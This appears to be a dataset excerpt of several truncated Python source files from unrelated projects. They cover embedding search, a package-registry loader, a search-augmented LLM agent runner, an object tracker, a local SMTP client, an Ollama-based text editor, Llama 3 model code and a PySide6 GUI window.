find_k_nearest_neighbors(self, index, k, cosine=True):\n        \"\"\"\n        Find k nearest neighbors for a given embedding index.\n        \n        Args:\n            index: Index of target embedding\n            k: Number of neighbors to find\n            cosine: If True, use cosine distance; if False, use dot product\n            \n        Returns:\n            list: Indices of k nearest neighbors\n        \"\"\"\n        target_embedding = self.embeddings[index]\n        \n        if cosine:\n            # Compute cosine distance\n            all_distances = np.array([distance.cosine(target_embedding, emb) \n                                    for emb in self.embeddings])\n            # Sort by ascending order (smaller distance = higher similarity)\n            nearest_indices = np.argsort(all_distances)[1:k+1]\n        else:\n            # Compute dot product\n            all_scores = util.dot_score(target_embedding, self.embeddings)[0].cpu().tolist()\n            # Sort by descending order (larger score = higher similarity)\n            nearest_indices = np.argsort(all_scores)[::-1][1:k+1]\n            \n        return nearest_indices.tolist()\n\n    def _compute_binomial_cramerrao(self, id, k, r, N):\n        \"\"\"Helper method to compute Cramer-Rao bound for binomial estimation.\"\"\"\n        p = r**id\n        return np.sqrt(p*(1-p)/(k*N*np.log(r)**2))\n\n    def _binomial_loglik(self, id, k, n, r):\n        \"\"\"Helper method to com",
    "import time\n\nfrom core.config import Config, PackageManager\nfrom core.db import DB\nfrom core.fetcher import TarballFetcher\nfrom core.logger import Logger\nfrom core.scheduler import Scheduler\nfrom package_managers.crates.transformer import CratesTransformer\n\nlogger = Logger(\"crates_orchestrator\")\n\n\ndef fetch(config: Config) -> TarballFetcher:\n    fetcher = TarballFetcher(\"crates\", config)\n    files = fetcher.fetch()\n    fetcher.write(files)\n    return fetcher\n\n\ndef load(db: DB, transformer: CratesTransformer, config: Config) -> None:\n    db.insert_packages(\n        transformer.packages(),\n        config.pm_config.pm_id,\n        PackageManager.CRATES.value,\n    )\n    db.insert_users(transformer.users(), config.user_types.github)\n    db.insert_user_packages(transformer.user_packages())\n\n    if not config.exec_config.test:\n        db.insert_urls(transformer.urls())\n        db.insert_package_urls(transformer.package_urls())\n        db.insert_versions(transformer.versions())\n        db.insert_user_versions(transformer.user_versions(), config.user_types.github)\n        db.insert_dependencies(transformer.dependencies())\n\n    db.insert_load_history(config.pm_config.pm_id)\n    logger.log(\"\u2705 crates\")\n\n\ndef run_pipeline(db: DB, config: Config) -> None:\n    fetcher = fetch(config)\n    transformer = CratesTransformer(config.url_types, config.user_types)\n    load(db, transformer, config)\n    fetcher.cleanup()\n\n    coda = (\n        \"validate by running \"\n        + '`psql \"postgresql://postgres:s3cr3t@localhost:5435/chai\" '\n        + '-c \"SELECT * FROM load_history;\"`'\n    )\n    logger.log(coda)\n\n\ndef main():\n    db = DB()\n    config = Config(PackageManager.CRATES, db)\n    logger.debug(config)\n\n    scheduler = Scheduler(\"crates\")\n    scheduler.start(run_pipeline, db, config)\n\n    # run immediately\n    scheduler.run_now(run_pipeline, db, config)\n\n    # keep the main thread alive so we can terminate the program with Ctrl+C\n    try:\n        while True:\n            time.sleep(1)\n    except KeyboardInterrupt:\n        scheduler.stop()\n\n\nif __name__ == \"__main__\":\n    main()\n",
    "# run_rag_agent.py\nimport os\nimport json\nimport time\nimport re\nimport requests\nfrom tqdm import tqdm\nimport numpy as np\nimport torch\nfrom typing import Optional, Tuple, List, Dict\nimport argparse\n\nfrom transformers import AutoTokenizer\nfrom vllm import LLM, SamplingParams\nfrom bing_search import bing_web_search, extract_relevant_info, fetch_page_content\nfrom evaluate import run_evaluation\nfrom prompts import (\n    get_singleqa_rag_agent_instruction, \n    get_multiqa_rag_agent_instruction, \n    get_gpqa_rag_agent_instruction, \n    get_math_rag_agent_instruction, \n    get_code_rag_agent_instruction,\n    get_task_instruction_openqa, \n    get_task_instruction_math, \n    get_task_instruction_multi_choice, \n    get_task_instruction_code, \n)\n\n# Define special symbols\nBEGIN_SEARCH_QUERY = \"<|begin_search_query|>\"\nEND_SEARCH_QUERY = \"<|end_search_query|>\"\nBEGIN_SEARCH_RESULT = \"<|begin_search_result|>\"\nEND_SEARCH_RESULT = \"<|end_search_result|>\"\nBEGIN_URL = \"<|begin_url|>\"\nEND_URL = \"<|end_url|>\"\nBEGIN_FULL_PAGE = \"<|begin_full_page|>\"\nEND_FULL_PAGE = \"<|end_full_page|>\"\n\ndef parse_args():\n    parser = argparse.ArgumentParser(description=\"Run RAG Agent for various datasets and models.\")\n\n    # Dataset and split configuration\n    parser.add_argument(\n        '--dataset_name',\n        type=str,\n        required=True,\n        choices=['gpqa', 'math500', 'aime', 'amc', 'livecode', 'nq', 'triviaqa', 'hotpotqa', '2wiki', 'musique', 'bamboogle', 'medmcqa', 'pubhealth'],\n        help=\"Name of the dataset to use.\"\n    )\n\n    parser.add_argument(\n        '--split',\n        type=str,\n        required=True,\n        choices=['test', 'diamond', 'main', 'extended'],\n        help=\"Dataset split to use.\"\n    )\n\n    parser.add_argument(\n        '--subset_num',\n        type=int,\n        default=-1,\n        help=\"Number of examples to process. Defaults to all if not specified.\"\n    )\n\n    # RAG Agent configuration\n    parser.add_argument(\n        '--max_search_limit',\n        type=int,\n        default=5,\n        help=\"Maximum number of searches per question.\"\n    )\n\n    parser.add_argument(\n        '--max_url_fetch',\n        type=int,\n        default=5,\n        help=\"Maximum number of URL fetches per question.\"\n    )\n\n    parser.add_argument(\n        '--max_turn',\n        type=int,\n        default=10,\n        help=\"Maximum number of turns.\"\n    )\n\n    parser.add_argument(\n        '--top_k',\n        type=int,\n        default=10,\n        help=\"Maximum number of search documents to return.\"\n    )\n\n    # Model configuration\n    parser.add_argument(\n        '--model_path',\n        type=str,\n        required=True,\n        help=\"Path to the pre-trained model.\"\n    )\n\n    parser.add_argument(\n        '--use_jina',\n        type=bool,\n        default=True,\n        help=\"Whether to use Jina API for document fetching.\"\n    )\n\n    parser.add_argument(\n        '--jina_api_key',\n        type=str,\n        default='None',\n        help=\"Your Jina API Key to Fetch URL Content.\"\n    )\n\n    # Sampling parameters\n    parser.add_argument(\n        '--temperature',\n        type=float,\n        default=0.7,\n        help=\"Sampling temperature.\"\n    )\n\n    parser.add_argument(\n        '--top_p',\n        type=float,\n        default=0.8,\n        help=\"Top-p sampling parameter.\"\n    )\n\n    parser.add_argument(\n        '--top_k_sampling',\n        type=int,\n        default=20,\n        help=\"Top-k sampling parameter.\"\n    )\n\n    parser.add_argument(\n        '--repetition_penalty',\n        type=float,\n        default=None,\n        help=\"Repetition penalty. If not set, defaults based on the model.\"\n    )\n\n    parser.add_argument(\n        '--max_tokens',\n        type=int,\n        default=32768,\n        help=\"Maximum number of tokens to generate. If not set, defaults based on the model and dataset.\"\n    )\n\n    # Bing API Configuration\n    parser.add_argument(\n        '--bing_subscription_key',\n        type=str,\n        required=True,\n        help=\"Bing Search API subscription key.\"\n    )\n\n    parser.add_argument(\n        '--bing_endpoint',\n        type=str,\n        default=\"https://api.bing.microsoft.com/v7.0/search\",\n        help=\"Bing Search API endpoint.\"\n    )\n\n    return parser.parse_args()\n\ndef main():\n    args = parse_args()\n\n    # Extract arguments\n    dataset_name = args.dataset_name\n    split = args.split\n    subset_num = args.subset_num\n    MAX_SEARCH_LIMIT = args.max_search_limit\n    MAX_URL_FETCH = args.max_url_fetch\n    MAX_TURN = args.max_turn\n    top_k = args.top_k\n    model_path = args.model_path\n    temperature = args.temperature\n    top_p = args.top_p\n    top_k_sampling = args.top_k_sampling\n    repetition_penalty = args.repetition_penalty\n    max_tokens = args.max_tokens\n    bing_subscription_key = args.bing_subscription_key\n    bing_endpoint = args.bing_endpoint\n    use_jina = args.use_jina\n    jina_api_key = args.jina_api_key\n\n    # Adjust parameters based on dataset\n    if dataset_name in ['nq', 'triviaqa', 'hotpotqa', 'musique', 'bamboogle', '2wiki',",
    "\"\"\"\n    SORT: A Simple, Online and Realtime Tracker\n    Copyright (C) 2016-2020 Alex Bewley alex@bewley.ai\n\n    This program is free software: you can redistribute it and/or modify\n    it under the terms of the GNU General Public License as published by\n    the Free Software Foundation, either version 3 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU General Public License for more details.\n\n    You should have received a copy of the GNU General Public License\n    along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\"\"\"\nfrom __future__ import print_function\n\nimport os\nimport numpy as np\nimport matplotlib\nmatplotlib.use('TkAgg')\nimport matplotlib.pyplot as plt\nimport matplotlib.patches as patches\nfrom skimage import io\n\nimport glob\nimport time\nimport argparse\nfrom filterpy.kalman import KalmanFilter\n\nnp.random.seed(0)\n\n\ndef linear_assignment(cost_matrix):\n  try:\n    import lap\n    _, x, y = lap.lapjv(cost_matrix, extend_cost=True)\n    return np.array([[y[i],i] for i in x if i >= 0]) #\n  except ImportError:\n    from scipy.optimize import linear_sum_assignment\n    x, y = linear_sum_assignment(cost_matrix)\n    return np.array(list(zip(x, y)))\n\n\ndef iou_batch(bb_test, bb_gt):\n  \"\"\"\n  From SORT: Computes IOU between two bboxes in the form [x1,y1,x2,y2]\n  \"\"\"\n  bb_gt = np.expand_dims(bb_gt, 0)\n  bb_test = np.expand_dims(bb_test, 1)\n  \n  xx1 = np.maximum(bb_test[..., 0], bb_gt[..., 0])\n  yy1 = np.maximum(bb_test[..., 1], bb_gt[..., 1])\n  xx2 = np.minimum(bb_test[..., 2], bb_gt[..., 2])\n  yy2 = np.minimum(bb_test[..., 3], bb_gt[..., 3])\n  w = np.maximum(0., xx2 - xx1)\n  h = np.maximum(0., yy2 - yy1)\n  wh = w * h\n  o = wh / ((bb_test[..., 2] - bb_test[..., 0]) * (bb_test[..., 3] - bb_test[..., 1])                                      \n    + (bb_gt[..., 2] - bb_gt[..., 0]) * (bb_gt[..., 3] - bb_gt[..., 1]) - wh)                                              \n  return(o)  \n\n\ndef convert_bbox_to_z(bbox):\n  \"\"\"\n  Takes a bounding box in the form [x1,y1,x2,y2] and returns z in the form\n    [x,y,s,r] where x,y is the centre of the box and s is the scale/area and r is\n    the aspect ratio\n  \"\"\"\n  w = bbox[2] - bbox[0]\n  h = bbox[3] - bbox[1]\n  x = bbox[0] + w/2.\n  y = bbox[1] + h/2.\n  s = w * h    #scale is just area\n  r = w / float(h)\n  return np.array([x, y, s, r]).reshape((4, 1))\n\n\ndef convert_x_to_bbox(x,score=None):\n  \"\"\"\n  Takes a bounding box in the centre form [x,y,s,r] and returns it in the form\n    [x1,y1,x2,y2] where x1,y1 is the top left and x2,y2 is the bottom right\n  \"\"\"\n  w = np.sqrt(x[2] * x[3])\n  h = x[2] / w\n  if(score==None):\n    return np.array([x[0]-w/2.,x[1]-h/2.,x[0]+w/2.,x[1]+h/2.]).reshape((1,4))\n  else:\n    return np.array([x[0]-w/2.,x[1]-h/2.,x[0]+w/2.,x[1]+h/2.,score]).reshape((1,5))\n\n\nclass KalmanBoxTracker(object):\n  \"\"\"\n  This class represents the internal state of individual tracked objects observed as bbox.\n  \"\"\"\n  count = 0\n  def __init__(self,bbox):\n    \"\"\"\n    Initialises a tracker using initial bounding box.\n    \"\"\"\n    #define constant velocity model\n    self.kf = KalmanFilter(dim_x=7, dim_z=4) \n    self.kf.F = np.array([[1,0,0,0,1,0,0],[0,1,0,0,0,1,0],[0,0,1,0,0,0,1],[0,0,0,1,0,0,0],  [0,0,0,0,1,0,0],[0,0,0,0,0,1,0],[0,0,0,0,0,0,1]])\n    self.kf.H = np.array([[1,0,0,0,0,0,0],[0,1,0,0,0,0,0],[0,0,1,0,0,0,0],[0,0,0,1,0,0,0]])\n\n    self.kf.R[2:,2:] *= 10.\n    self.kf.P[4:,4:] *= 1000. #give high uncertainty to the unobservable initial velocities\n    self.kf.P *= 10.\n    self.kf.Q[-1,-1] *= 0.01\n    self.kf.Q[4:,4:] *= 0.01\n\n    self.kf.x[:4] = convert_bbox_to_z(bbox)\n    self.time_since_update = 0\n    self.id = KalmanBoxTracker.count\n    KalmanBoxTracker.count += 1\n    self.history = []\n    self.hits = 0\n    self.hit_streak = 0\n    self.age = 0\n\n  def update(self,bbox):\n    \"\"\"\n    Updates the state vector with observed bbox.\n    \"\"\"\n    self.time_since_update = 0\n    self.history = []\n    self.hits += 1\n    self.hit_streak += 1\n    self.kf.update(convert_bbox_to_z(bbox))\n\n  def predict(self):\n    \"\"\"\n    Advances the state vector and returns the predicted bounding box estimate.\n    \"\"\"\n    if((self.kf.x[6]+self.kf.x[2])<=0):\n      self.kf.x[6] *= 0.0\n    self.kf.predict()\n    self.age += 1\n    if(self.time_since_update>0):\n      self.hit_streak = 0\n    self.time_since_update += 1\n    self.history.append(convert_x_to_bbox(self.kf.x))\n    return self.history[-1]\n\n  def get_state(self):\n    \"\"\"\n    Returns the current bounding box estimate.\n    \"\"\"\n    return convert_x_to_bbox(self.kf.x)\n\n\ndef associate_detections_to_trackers(detections,trackers,iou_threshold = 0.3):\n  \"\"\"\n  Assigns detections to tracked object (both represented as bounding boxes)\n\n  Returns 3 lists of matches, unmatched_detections and unmatched_trackers\n  \"\"\"\n  if(len(trackers)==0):\n    ret",
    "import asyncio\nimport base64\nfrom cryptography.fernet import Fernet\nimport ssl\nfrom email.utils import formatdate\nimport logging\n\n# Configurar logs\nlogging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')\n\nSMTP_SERVER = \"127.0.0.1\"\nSMTP_PORT = 2525\n\ndef load_key():\n    logging.info(\"Cargando clave de cifrado.\")\n    with open(\"secret.key\", \"rb\") as key_file:\n        return key_file.read()\n\ncipher_suite = Fernet(load_key())\n\ndef validate_email(email):\n    logging.debug(f\"Validando direcci\u00f3n de correo: {email}\")\n    pass  # Validaci\u00f3n desactivada para pruebas\n\nasync def read_response(reader):\n    # Leer la respuesta del servidor SMTP\n    response = await reader.read(1024)\n    response_decoded = response.decode()\n    logging.debug(f\"Respuesta del servidor: {response_decoded.strip()}\")\n\n    if not (response_decoded.startswith(\"2\") or response_decoded.startswith(\"3\") or response_decoded.startswith(\"5\")):\n        logging.error(f\"Error del servidor: {response_decoded.strip()}\")\n        raise Exception(f\"Error del servidor: {response_decoded}\")\n    \n    return response_decoded\n\n# Solicitar mensajes del servidor\nasync def retrieve_messages(reader, writer):\n    try:\n        logging.info(\"Solicitando mensajes al servidor.\")\n        writer.write(b\"RETRIEVE\\r\\n\")\n        await writer.drain()\n        response = await read_response(reader)\n        return response\n    except Exception as e:\n        logging.error(f\"Error al solicitar mensajes: {e}\")\n        return None\n    \nasync def send_email(sender, recipient, subject, message, username, password):\n    logging.info(\"Iniciando env\u00edo de correo con credenciales externas.\")\n    validate_email(sender)\n    validate_email(recipient)\n\n    # Construir el mensaje\n    logging.debug(\"Construyendo el mensaje.\")\n    headers = f\"From: {sender}\\nTo: {recipient}\\nSubject: {subject}\\nDate: {formatdate(localtime=True)}\\n\"\n    full_message = headers + \"\\n\" + message\n\n    # Cifrar el mensaje\n    logging.debug(\"Cifrando el mensaje.\")\n    encrypted_message = cipher_suite.encrypt(full_message.encode())\n\n    ssl_context = ssl.create_default_context()\n    ssl_context.load_verify_locations(\"server.crt\")\n    \n    reader, writer = None, None\n\n    try:\n        # Abrir conexi\u00f3n\n        logging.info(f\"Conectando al servidor SMTP en {SMTP_SERVER}:{SMTP_PORT}.\")\n        reader, writer = await asyncio.open_connection(SMTP_SERVER, SMTP_PORT, ssl=ssl_context)\n\n        # Leer bienvenida del servidor\n        await read_response(reader)\n\n        # EHLO\n        logging.info(\"Enviando comando EHLO.\")\n        writer.write(b\"EHLO localhost\\r\\n\")\n        await writer.drain()\n        await read_response(reader)\n\n        # AUTH LOGIN\n        logging.info(\"Iniciando autenticaci\u00f3n.\")\n        writer.write(b\"AUTH LOGIN\\r\\n\")\n        await writer.drain()\n        await read_response(reader)\n\n        # Enviar nombre de usuario\n        logging.debug(\"Enviando nombre de usuario.\")\n        writer.write(base64.b64encode(username.encode()) + b\"\\r\\n\")\n        await writer.drain()\n        await read_response(reader)\n\n        # Enviar contrase\u00f1a \n        logging.debug(\"Enviando contrase\u00f1a.\")\n        writer.write(base64.b64encode(password.encode()) + b\"\\r\\n\")\n        await writer.drain()\n        await read_response(reader)\n\n        # Solicitar mensajes despu\u00e9s de iniciar sesi\u00f3n\n        messages = await retrieve_messages(reader, writer)\n\n        if messages:\n            logging.info(\"Guardando mensajes en archivo local.\")\n            with open(\"messages.txt\", \"w\") as file:\n                file.write(messages)\n            logging.info(\"Mensajes guardados correctamente en messages.txt.\")\n        else:\n            logging.info(\"No hay mensajes nuevos.\")\n            \n        # MAIL FROM\n        logging.info(f\"Enviando comando MAIL FROM para: {sender}.\")\n        writer.write(f\"MAIL FROM:<{sender}>\\r\\n\".encode())\n        await writer.drain()\n        await read_response(reader)\n\n        # RCPT TO\n        logging.info(f\"Enviando comando RCPT TO para: {recipient}.\")\n        writer.write(f\"RCPT TO:<{recipient}>\\r\\n\".encode())\n        await writer.drain()\n        await read_response(reader)\n\n        # DATA\n        logging.info(\"Enviando comando DATA.\")\n        writer.write(b\"DATA\\r\\n\")\n        await writer.drain()\n        await read_response(reader)\n\n        # Enviar mensaje cifrado\n        logging.info(\"Enviando el mensaje cifrado.\")\n        writer.write(encrypted_message + b\"\\r\\n.\\r\\n\")\n        await writer.drain()\n        await read_response(reader)\n\n        # QUIT\n        logging.info(\"Enviando comando QUIT.\")\n        writer.write(b\"QUIT\\r\\n\")\n        await writer.drain()\n        await read_response(reader)\n\n        logging.info(\"Correo enviado correctamente.\")\n\n    except Exception as e:\n        logging.error(f\"Error al enviar el correo: {e}\")\n    \n    finally:\n        if writer:\n            logging.info(\"Cerrando la conexi\u00f3n con el servidor.\")\n            writer.close()\n            await writer.wait_clos",
    "import tkinter as tk\r\nfrom tkinter import scrolledtext, filedialog, messagebox, simpledialog\r\nimport difflib\r\nimport re\r\nfrom datetime import datetime\r\nimport textwrap\r\nimport os\r\n\r\ntry:\r\n    from ollama import Client\r\nexcept ImportError:\r\n    print(\"Please install the ollama package (pip install ollama).\")\r\n    Client = None\r\n\r\n# --------------\r\n# Configurable prompts for each button\r\n# --------------\r\nPROMPTS = {\r\n    \"Grammar\": \"Fix grammar issues without altering the meaning.\",\r\n    \"Proofread\": \"Proofread the text comprehensively, correcting errors and improving readability.\",\r\n    \"Natural\": \"Refine awkward phrasing to make the text feel natural while preserving the original meaning.\",\r\n    \"Streamline\": \"Remove unnecessary elements, clarify the message, and ensure coherence and ease of understanding.\",\r\n    \"Awkward\": \"Fix only awkward or poorly written sentences without making other changes.\",\r\n    \"Rewrite\": \"Rewrite the text to improve clarity, flow, and overall readability.\",\r\n    \"Concise\": \"Make the text more concise by removing redundancy and unnecessary content.\",\r\n    \"Polish\": \"Refine awkward words or phrases to give the text a polished and professional tone.\",\r\n    \"Improve\": \"Enhance the text by proofreading and improving its clarity, flow, and coherence.\",\r\n}\r\n\r\n# --------------\r\n# Custom dialog to allow an 80-character-wide prompt entry\r\n# --------------\r\nclass LargerPromptDialog(simpledialog._QueryString):\r\n    def body(self, master):\r\n        # Let the superclass build the main layout\r\n        super().body(master)\r\n        # Force the entry to be a wider text field\r\n        self.entry.config(width=80)\r\n\r\ndef ask_custom_string(title, prompt, parent=None):\r\n    \"\"\"Ask for a string in a custom 80-char wide prompt dialog.\"\"\"\r\n    d = LargerPromptDialog(title, prompt)\r\n    return d.result\r\n\r\n\r\n# --------------\r\n# Simple Tooltip class\r\n# --------------\r\nclass ToolTip:\r\n    \"\"\"\r\n    A simple tooltip for tkinter widgets.\r\n    Usage: create_tooltip(widget, text='Hello!')\r\n    \"\"\"\r\n    def __init__(self, widget, text):\r\n        self.widget = widget\r\n        self.text = text\r\n        self.tip_window = None\r\n        self.id = None\r\n        self.x = self.y = 0\r\n\r\n        self.widget.bind(\"<Enter>\", self.enter)\r\n        self.widget.bind(\"<Leave>\", self.leave)\r\n\r\n    def enter(self, event=None):\r\n        self.showtip()\r\n\r\n    def leave(self, event=None):\r\n        self.hidetip()\r\n\r\n    def showtip(self):\r\n        if self.tip_window or not self.text:\r\n            return\r\n        x = self.widget.winfo_rootx() + 20\r\n        y = self.widget.winfo_rooty() + self.widget.winfo_height() - 45\r\n        self.tip_window = tw = tk.Toplevel(self.widget)\r\n        tw.wm_overrideredirect(True)  # removes the window decorations\r\n        tw.geometry(f\"+{x}+{y}\")\r\n        label = tk.Label(\r\n            tw,\r\n            text=self.text,\r\n            justify=tk.LEFT,\r\n            background=\"#ffffe0\",\r\n            relief=tk.SOLID,\r\n            borderwidth=1,\r\n            font=(\"tahoma\", \"8\", \"normal\")\r\n        )\r\n        label.pack(ipadx=1)\r\n\r\n    def hidetip(self):\r\n        tw = self.tip_window\r\n        self.tip_window = None\r\n        if tw:\r\n            tw.destroy()\r\n\r\n\r\ndef create_tooltip(widget, text):\r\n    \"\"\"Helper to attach a tooltip with given text to a widget.\"\"\"\r\n    ToolTip(widget, text)\r\n\r\n\r\n# --------------\r\n# Main application class\r\n# --------------\r\nclass EditorApp:\r\n    def __init__(self, root):\r\n        self.root = root\r\n        self.root.title(\"TextEnhanceAI Editor with Local LLM - V 0.1\")\r\n\r\n        # ----------------------\r\n        # 1) Set starting size and use it as the minimum\r\n        # ----------------------\r\n        self.root.geometry(\"800x600\")\r\n        self.root.minsize(800, 600)\r\n\r\n        # Ollama client (make sure you've installed and are running your local LLM server)\r\n        self.ollama_client = Client() if Client else None\r\n\r\n        # Text area (scrolled)\r\n        self.text_area = scrolledtext.ScrolledText(self.root, wrap=tk.WORD, width=80, height=25)\r\n        self.text_area.pack(padx=5, pady=5, fill=tk.BOTH, expand=True)\r\n\r\n        # Frame for buttons\r\n        btn_frame = tk.Frame(self.root)\r\n        btn_frame.pack(fill=tk.X, padx=5, pady=5)\r\n\r\n        # Create standard editing buttons\r\n        for label in [\"Grammar\", \"Proofread\", \"Natural\", \"Streamline\",\r\n                      \"Awkward\", \"Rewrite\", \"Concise\", \"Polish\", \"Improve\"]:\r\n            b = tk.Button(\r\n                btn_frame, \r\n                text=label, \r\n                command=lambda lbl=label: self.run_llm_edit(lbl)\r\n            )\r\n            b.pack(side=tk.LEFT, padx=2)\r\n            # Show the prompt in a tooltip\r\n            create_tooltip(b, PROMPTS[label])\r\n\r\n        # Add the Translate button BEFORE the \"Custom\" button\r\n        translate_btn = tk.Button(btn_frame, text=\"Translate\", command=self.run_translate_prompt)\r\n        translate_btn.pack(side=tk.LEFT, padx=2)\r\n        create_tooltip(translate_btn, \"Prompt us",
    "# Copyright (c) Meta Platforms, Inc. and affiliates.\n# This software may be used and distributed in accordance with the terms of the Llama 3 Community License Agreement.\n\nimport math\nfrom dataclasses import dataclass\nfrom typing import Optional, Tuple\n\nimport fairscale.nn.model_parallel.initialize as fs_init\nimport torch\nimport torch.nn.functional as F\nfrom fairscale.nn.model_parallel.layers import (\n    ColumnParallelLinear,\n    RowParallelLinear,\n    VocabParallelEmbedding,\n)\nfrom torch import nn\n\n\n@dataclass\nclass ModelArgs:\n    dim: int = 4096\n    n_layers: int = 32\n    n_heads: int = 32\n    n_kv_heads: Optional[int] = None\n    vocab_size: int = -1\n    multiple_of: int = 256  # make SwiGLU hidden layer size multiple of large power of 2\n    ffn_dim_multiplier: Optional[float] = None\n    norm_eps: float = 1e-5\n    rope_theta: float = 500000\n\n    max_batch_size: int = 32\n    max_seq_len: int = 2048\n\n\nclass RMSNorm(torch.nn.Module):\n    def __init__(self, dim: int, eps: float = 1e-6):\n        super().__init__()\n        self.eps = eps\n        self.weight = nn.Parameter(torch.ones(dim))\n\n    def _norm(self, x):\n        return x * torch.rsqrt(x.pow(2).mean(-1, keepdim=True) + self.eps)\n\n    def forward(self, x):\n        output = self._norm(x.float()).type_as(x)\n        return output * self.weight\n\n\ndef precompute_freqs_cis(dim: int, end: int, theta: float = 10000.0):\n    freqs = 1.0 / (theta ** (torch.arange(0, dim, 2)[: (dim // 2)].float() / dim))\n    t = torch.arange(end, device=freqs.device, dtype=torch.float32)\n    freqs = torch.outer(t, freqs)\n    freqs_cis = torch.polar(torch.ones_like(freqs), freqs)  # complex64\n    return freqs_cis\n\n\ndef reshape_for_broadcast(freqs_cis: torch.Tensor, x: torch.Tensor):\n    ndim = x.ndim\n    assert 0 <= 1 < ndim\n    assert freqs_cis.shape == (x.shape[1], x.shape[-1])\n    shape = [d if i == 1 or i == ndim - 1 else 1 for i, d in enumerate(x.shape)]\n    return freqs_cis.view(*shape)\n\n\ndef apply_rotary_emb(\n    xq: torch.Tensor,\n    xk: torch.Tensor,\n    freqs_cis: torch.Tensor,\n) -> Tuple[torch.Tensor, torch.Tensor]:\n    xq_ = torch.view_as_complex(xq.float().reshape(*xq.shape[:-1], -1, 2))\n    xk_ = torch.view_as_complex(xk.float().reshape(*xk.shape[:-1], -1, 2))\n    freqs_cis = reshape_for_broadcast(freqs_cis, xq_)\n    xq_out = torch.view_as_real(xq_ * freqs_cis).flatten(3)\n    xk_out = torch.view_as_real(xk_ * freqs_cis).flatten(3)\n    return xq_out.type_as(xq), xk_out.type_as(xk)\n\n\ndef repeat_kv(x: torch.Tensor, n_rep: int) -> torch.Tensor:\n    \"\"\"torch.repeat_interleave(x, dim=2, repeats=n_rep)\"\"\"\n    bs, slen, n_kv_heads, head_dim = x.shape\n    if n_rep == 1:\n        return x\n    return (\n        x[:, :, :, None, :]\n        .expand(bs, slen, n_kv_heads, n_rep, head_dim)\n        .reshape(bs, slen, n_kv_heads * n_rep, head_dim)\n    )\n\n\nclass Attention(nn.Module):\n    def __init__(self, args: ModelArgs):\n        super().__init__()\n        self.n_kv_heads = args.n_heads if args.n_kv_heads is None else args.n_kv_heads\n        model_parallel_size = fs_init.get_model_parallel_world_size()\n        self.n_local_heads = args.n_heads // model_parallel_size\n        self.n_local_kv_heads = self.n_kv_heads // model_parallel_size\n        self.n_rep = self.n_local_heads // self.n_local_kv_heads\n        self.head_dim = args.dim // args.n_heads\n\n        self.wq = ColumnParallelLinear(\n            args.dim,\n            args.n_heads * self.head_dim,\n            bias=False,\n            gather_output=False,\n            init_method=lambda x: x,\n        )\n        self.wk = ColumnParallelLinear(\n            args.dim,\n            self.n_kv_heads * self.head_dim,\n            bias=False,\n            gather_output=False,\n            init_method=lambda x: x,\n        )\n        self.wv = ColumnParallelLinear(\n            args.dim,\n            self.n_kv_heads * self.head_dim,\n            bias=False,\n            gather_output=False,\n            init_method=lambda x: x,\n        )\n        self.wo = RowParallelLinear(\n            args.n_heads * self.head_dim,\n            args.dim,\n            bias=False,\n            input_is_parallel=True,\n            init_method=lambda x: x,\n        )\n\n        self.cache_k = torch.zeros(\n            (\n                args.max_batch_size,\n                args.max_seq_len,\n                self.n_local_kv_heads,\n                self.head_dim,\n            )\n        ).cuda()\n        self.cache_v = torch.zeros(\n            (\n                args.max_batch_size,\n                args.max_seq_len,\n                self.n_local_kv_heads,\n                self.head_dim,\n            )\n        ).cuda()\n\n    def forward(\n        self,\n        x: torch.Tensor,\n        start_pos: int,\n        freqs_cis: torch.Tensor,\n        mask: Optional[torch.Tensor],\n    ):\n        bsz, seqlen, _ = x.shape\n        xq, xk, xv = self.wq(x), self.wk(x), self.wv(x)\n\n        xq = xq.view(bsz, seqlen, self.n_local_heads, self.head_dim)\n        xk = xk.view(bsz, seqlen, self.n_local_kv_heads, self.head_dim)",
    "# --------------------------------------- Standard Libraries ---------------------------------------\nimport os\nimport ctypes\n# --------------------------------------- Third-Party Libraries ---------------------------------------\nfrom PySide6.QtWidgets import QApplication, QVBoxLayout, QLabel, QPushButton, QHBoxLayout, QHeaderView, QTableWidgetItem, QFileSystemModel, QStackedLayout, QWidget, QAbstractItemView\nfrom PySide6.QtCore import Qt, QSize, Signal, QThread, QObject, QTimer\nfrom PySide6.QtGui import QGuiApplication\nfrom qframelesswindow import AcrylicWindow, StandardTitleBar\nfrom qfluentwidgets import TableWidget, setTheme, setThemeColor, Theme\n# --------------------------------------- Project-specific Imports ---------------------------------------\nimport Core.Initializer\nfrom Core.Logger import logger\nfrom UIComponents.Spinner import LoadingSpinner\nfrom UIComponents.Tooltips import apply_tooltip\nfrom UIComponents.AcrylicEffect import AcrylicEffect\n\nclass SelectGameWindow(AcrylicWindow):\n    gameSelected = Signal(str)\n\n    def __init__(self, parent=None):\n        try:\n            super().__init__(parent)\n            self.setWindowTitle(\"FC Rollback Tool - Select Game\")\n            self.resize(500, 300)\n            AcrylicEffect(self)  # \u0625\u0633\u062a\u062f\u0639\u0627\u0621 .. \u062a\u0639\u0637\u064a\u0644 / \u062a\u0641\u0639\u064a\u0644 \u0627\u0644\u0627\u0643\u0631\u064a\u0644\u0643 \u062d\u0633\u0628 \u0627\u0646\u0648\u0639 \u0627\u0644\u0648\u064a\u0646\u062f\u0648\u0632 \n            # \u062a\u0645\u0631\u0643\u0632 \u0627\u0644\u0646\u0627\u0641\u0630\u0629\n            screen = QGuiApplication.primaryScreen().geometry()\n            window_geometry = self.geometry()\n            x = (screen.width() - window_geometry.width()) // 2\n            y = (screen.height() - window_geometry.height()) // 2\n            self.move(x, y)\n\n            self.setup_ui()\n        except Exception as e:\n            self.handle_error(f\"Error initializing SelectGameWindow: {e}\")\n\n        \n    def setup_ui(self):\n        try:\n            self.main_layout = QVBoxLayout(self)\n            self.main_layout.setContentsMargins(0, 5, 0, 5)\n\n            self.create_title_bar()\n            self.stacked_layout = QStackedLayout()\n            self.create_table()\n            self.create_spinner()\n            self.stacked_layout.setCurrentWidget(self.table)\n            self.main_layout.addLayout(self.stacked_layout)\n            self.create_buttons()\n        except Exception as e:\n            self.handle_error(f\"Error setting up UI: {e}\")\n\n    def create_title_bar(self):\n        try:\n            title_bar_layout = QVBoxLayout()\n            title_bar_layout.setContentsMargins(0, 3, 0, 3)\n            # \u062a\u062e\u0635\u064a\u0635 